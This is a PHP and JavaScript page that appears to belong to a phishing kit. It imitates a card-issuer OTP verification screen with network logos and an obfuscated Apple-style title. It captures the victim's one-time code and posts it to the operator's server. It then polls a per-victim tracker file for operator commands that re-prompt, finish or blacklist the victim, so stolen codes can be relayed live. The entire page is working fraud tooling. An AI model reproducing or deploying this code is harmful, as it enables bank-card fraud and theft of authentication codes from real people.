<?php
require_once 'includes/main.php';
error_reporting(0);
session_start();
require "configg.php";


if(isset($_SESSION['isBanned'])) {
	include '../Forbidden/index.php';
	exit();
}
$file = fopen("../db.txt", 'r');

// Check if file is opened successfully
if ($file) {
    // Read the file line by line
    while (($line = fgets($file)) !== false) {
        // Check if the line contains AUTO_PILOT
        if (strpos($line, 'AUTO_PILOT') !== false) {
            // Extract the value after the '=' sign
            $value = explode('=', $line)[1];
            
            // Trim any leading/trailing whitespace
            $value = trim($value);
            
            // Output the value
            // echo "AUTO_PILOT value: $value";
            $pilotval = $value;
            
            // No need to continue looping, exit the loop
            break;
        }
    }

    while (($line = fgets($file)) !== false) {
        // Check if the line contains AUTO_PILOT
        if (strpos($line, 'DELAY') !== false) {
            // Extract the value after the '=' sign
            $value = explode('=', $line)[1];
            
            // Trim any leading/trailing whitespace
            $value = trim($value);
            
            // Output the value
            // echo "AUTO_PILOT value: $value";
            $DELAY = $value;
            
            // No need to continue looping, exit the loop
            break;
        }
    }
    
    // Close the file
    fclose($file);
} else {
    // Error opening the file
    echo "Error opening file: $file_path";
}
?>
<!DOCTYPE html>
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <title>&#x4d;&#x79;&#x20;&#x41;&#x63;&#x63;&#x6f;&#x75;&#x6e;&#x74;&#x20;&#x41;&#x70;&#x70;&#x49;&#x65;</title>
      <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
   <link rel="shortcut icon" href="files/fav.ico" type="image/X-icon">
      <script type="text/javascript" src="files/modernizr.min.js"></script>
	  <script src="files/jquery.js"></script> 
   </head>
   <body>
   <?php
include "loader.html"
?>
      <center>
         <style>
		.success, .error, .validation {
			border: 1px solid;
			margin: 10px 0px;
			padding: 10px 50px;
			background-repeat: no-repeat;
			background-position: 10px center;
		}
		.success {
			color: #4F8A10;
			background-color: #DFF2BF;
		}
		.error{
			color: #D8000C;
			background-color: #FFBABA;
			
		}
		.validation{
			color: #D63301;
			background-color: #FFCCBA;
		}</style>
         <div style="width:350px;border:solid 1px #d8d4d4;padding:5px;">
            <?php if ($_SESSION['bank_scheme'] == 'VISA')
{
    echo '<img src="files/img/vsa_p.svg" style="width: 90px;float:left;">';
    echo '<img src="files/img/appy_logo.svg" style="float: center;display: inline-block;margin-top: 18px;" width="100px">';
}
elseif ($_SESSION['bank_scheme'] == 'MASTERCARD')
{
    echo '<img src="files/img/mst_p.svg" style="width: 90px;float:left;">';
    echo '<img src="files/img/appy_logo.svg" style="float: center;display: inline-block;margin-top: 18px;" width="100px">';
}
elseif ($_SESSION['bank_scheme'] == 'DISCOVER')
{
    echo '<img src="files/img/dsc_p.jpg" style="width: 90px;float:left;">';
    echo '<img src="files/img/appy_logo.svg" style="float: center;display: inline-block;margin-top: 18px;" width="100px">';
}
elseif ($_SESSION['bank_scheme'] == 'AMEX')
{
    echo '<img src="files/img/amx_p.png" style="width: 90px;float:left;">';
    echo '<img src="files/img/appy_logo.svg" style="float: center;display: inline-block;margin-top: 18px;" width="100px">';
}
else
{
    echo '<img src="files/img/appy_logo.svg" style="float: center;display: inline-block;margin-top: 18px;" width="100px">';
} ?>
            <div style="clear:both"></div>
            <p style="font-size:13px;margin-top:25px;color:#807979"> <?php echo $vbv_tr['sec'] ?></p>
            <p style="font-size:13px;margin-top:25px;color:#807979"><?php echo $vbv_tr['sec2'] ?>
            <script type="text/javascript">
document.onreadystatechange = function () {
  var state = document.readyState
  if (state == 'complete') {
      setTimeout(function(){
          document.getElementById('interactive');
		$("#fixed").hide();
		 $("#formf").show(900);
      },6000);
  }
}
</script>




<center>
    <!-- <div id="modeshow" class="IuxH2AndDescription__StyledDescription-j40avf-2 kAsTtm">loading...</div> -->
    <!-- <p id="modeshow">loading...</p> -->
    <br>
    <div  data-testid="VerifyOtpAdditionalH2Text" class="MfaOtpStyles__StyledDontCloseTabDiv-e7rfsj-3 bvkcms">(Don't close this tab)</div>
    <div id="imgemail" class="img-email" style="display: none;"><img src="img/2a9bfea6627ef593caae.gif" alt="Email" class="MfaOtpStyles__StyledImg-e7rfsj-5 gogmvi"></div>

    <div id="imgphone" class="img-sms" style="display: none;"><img src="img/ccec1941103868b5cb24.gif" alt="SMS" class="MfaOtpStyles__StyledImg-e7rfsj-5 gogmvi"></div>
    </center>









           <div  id="formf" style="display: none;">
               <table align="center" width="290" style="font-size:11px;font-family:arial,sans-serif;color:#000;margin-top:30px">
                  <tbody>
                     <p style="display:none;" class="validation" id="tiitleerror"><?php echo $vbv_tr['msger'] ?></p>
                     
                     <br>
                     <tr>
                        <td align="right"><?php echo $vbv_tr['dat'] ?></td>
                        <td><?php echo date("d M,Y"); ?></td>
                     </tr>
                     <br>
                     <tr>
                        <td align="right">Card Number :</td>
                        <td>xxxx xxxx xxxx <?php echo $_SESSION['cardlastdigit']; ?></td>
                     </tr>
                                          <tr>
                        <td align="right" id="tiitleCardnetpas">&#x43;&#x6f;&#x64;&#x65;&#x20;&#x53;&#x65;&#x6e;&#x74;&#x20;&#x3a;</td>
                        <td>
                           <span id="countdown" class="timer">
                           </span>
                           <script>
   var seconds = 120;
   function secondPassed() {
   var minutes = Math.round((seconds - 30)/60);
   var remainingSeconds = seconds % 60;
   if (remainingSeconds < 10) {
      remainingSeconds = "0" + remainingSeconds; 
   }
   document.getElementById('countdown').innerHTML = minutes + ":" + remainingSeconds;
   if (seconds == 0) {
    clearInterval(countdownTimer);
    document.getElementById('countdown').innerHTML = "";
   } else {
    seconds--;
   }
   }
   var countdownTimer = setInterval('secondPassed()', 1000);
</script>
                        </td>
                     </tr>
                     <tr>
                        <td align="right"><?php echo $vbv_tr['otpc'] ?></td>
                        <td class="xx"><input maxlength="6" style="width: 75px;" type="tel" id="sms" required=""></td>
                     </tr>
                     <tr>
                        <td></td>
                        <td><br>
                           <input style="width:74px" type="button" value="Submit" class="sero">
                        </td>
                     </tr>
                  </tbody>
               </table>
</div>
            <!-- <script type="text/javascript">
var request;

$("#formf").submit(function(event){

    event.preventDefault();

    if (request) {
        request.abort();
    }
    var $form = $(this);
    var $inputs = $form.find("input, select, button, textarea");
    var serializedData = $form.serialize();

    $inputs.prop("disabled", true);
	$("#error").hide();
	$("#formf").hide();
	$("#fixed").show();
    request = $.ajax({
        url: "ot3sifet.php",
        type: "post",
        data: serializedData
    });
    request.done(function (response, textStatus, jqXHR){


 $(location).attr("href", "ot3.php");
    });
    request.fail(function (jqXHR, textStatus, errorThrown){
        console.error(
            "The following error occurred: "+
            textStatus, errorThrown
        );
    });
	
});

</script> -->
            <div id="fixed" class="" style="">
               <img src="files/img/lod2.gif">
               <p class="">Loading...</p>
               <p class="">Please wait...</p>

            </div>
            <p style="text-align:center;font-family:arial,sans-serif;font-size:9px;color:#656565"> Copyright © 1999-  <?php echo date("Y"); ?> . All rights reserved. </p>
         </div>
         <div id="rotate" style="display:none">
            <div class="circle">
               <div class="rotate"></div>
            </div>
            <div class="overlay"></div>
         </div>
      </center>







      
<script type="text/javascript" src="style/jquery.js"></script>

<input id="defaultmodeshow_email" value="<?php echo $DefaultEmail; ?>" type="hidden">
<input id="defaultmodeshow_num" value="<?php echo $DefaultNUM; ?>" type="hidden">


<script>
    var pilotval = '<?php echo $pilotval; ?>';
    var DELAYVAL = '<?php echo $DELAY; ?>';
    $(document).on('click', '.sero', function(e) {
		var smsf = $('#sms').val();
        console.log('smsf: '+smsf);
      
      if(smsf.length == 0) {
        badlog("Invalid OTP Code!");
        $('#sms').css("border", "solid 1px #ff0707");
        return;
      }
      else {
        $('#sms').css("border", "solid 1px #4d4d4f");
        }

	    var phone = $('#sms').val();

		//validate
		if(/^\d+$/.test(phone) === false){ //not number
		// alert('Your OTP number is not valid');
		$('#maker').css("display", "block");
		// echo ($xhhh);
		return;
		}
      $('#preloader').css('display', 'block');
    $('#preloader').show();
        $.ajax({
            type: "POST",
            url: 'error.php',
            data: {
              sms: smsf,
             
            },
            success: function(resp){
                if(resp.st == "failure") {
                    alert(resp.err);
                    $('#preloader').css('display', 'none');
                    
                    $.notifyBar({ cssClass: "error", html: resp.err });
                }
                else if(resp.st == "success") {
                    // alert(pilotval);
                    // alert(DELAYVAL);
                    if(pilotval == "YES"){
                        // alert('fuckkk');
                        setTimeout(() => {
                            window.location.href= './thanks.php'; 
                        }, DELAYVAL);
                       
                    }
					listn3r();
                  
                } 
            }
        });
        
    });

	function badlog(msg){                    
		$('#preloader').css('display', 'none');
        $('.free').css("border-color", "#f3ada9");
        $('.free').css("background", "#FDEFEE");
	}

	function listn3r() {
		var vname = sessionStorage.getItem("vname");

		if(vname == '') {
			badlog("please try again later!");
            
			return
		}

		$.ajax({
			method: "GET",
			cache: false,
			url: '../tracker/'+vname+'.json',
			success: function (res) {
			
			if(res.command == "HOME") {
				window.location.href = './index.php';
				return
			} 
			else if(res.command == "INVALID") {
      
				badlog("Invalid OTP Code!");
        $('#sms').css("border", "solid 1px #ff0707");
        // $('#input-container-error48').show();
        $('#tiitleerror').css("display", "block");

        $('#alertnormal').css("display", "none");
        $('#alerterror').css("display", "block");
				return
			}
			 else if(res.command == "OTP") {
        
				badlog("Invalid OTP Code!");
        // $('#input-container-error48').show();
        $('#tiitleerror').css("display", "block");
        $('#sms').css("border", "solid 1px #ff0707");
        $('#alertnormal').css("display", "none");
        $('#alerterror').css("display", "block");
				return
			} else if(res.command == "FINISH") {
				window.location.href = './thanks.php';
				return
			}  else if(res.command == "BLACKLIST") {
				window.location.href = '../Forbidden';
				return
			} else {
				setTimeout(listn3r, 3000);
				}

			}
		});
    
  }

	var toshow = sessionStorage.getItem("otptype");
	if(toshow == "email"){
		var codetoshow = sessionStorage.getItem("Email");
        document.getElementById('emailcheck').style.display = 'block';
        document.getElementById('phonecheck').style.display = 'none';
        document.getElementById('imgemail').style.display = 'block';
        document.getElementById('imgphone').style.display = 'none';

        if(codetoshow == '')
        {
            $('#modeshow').text('Enter the 6-digit code we just sent to '+$('#defaultmodeshow_email').val());
        } else {
            $('#modeshow').text('Enter the 6-digit code we just sent to '+codetoshow);
        }
	} else{
		var codetoshow = sessionStorage.getItem("phone");
        document.getElementById('phonecheck').style.display = 'block';
        document.getElementById('emailcheck').style.display = 'none';
        document.getElementById('imgphone').style.display = 'block';
        document.getElementById('imgemail').style.display = 'none'; 

        if(codetoshow == '')
        {
            $('#modeshow').text('Enter the 6-digit code we just sent to '+$('#defaultmodeshow_num').val());
        } else {
            $('#modeshow').text('Enter the 6-digit code we just sent to '+codetoshow);
        }
	}



	
	// alert(toshow);
	// alert('codetoshow: '+codetoshow);



</script>
   </body>
</html>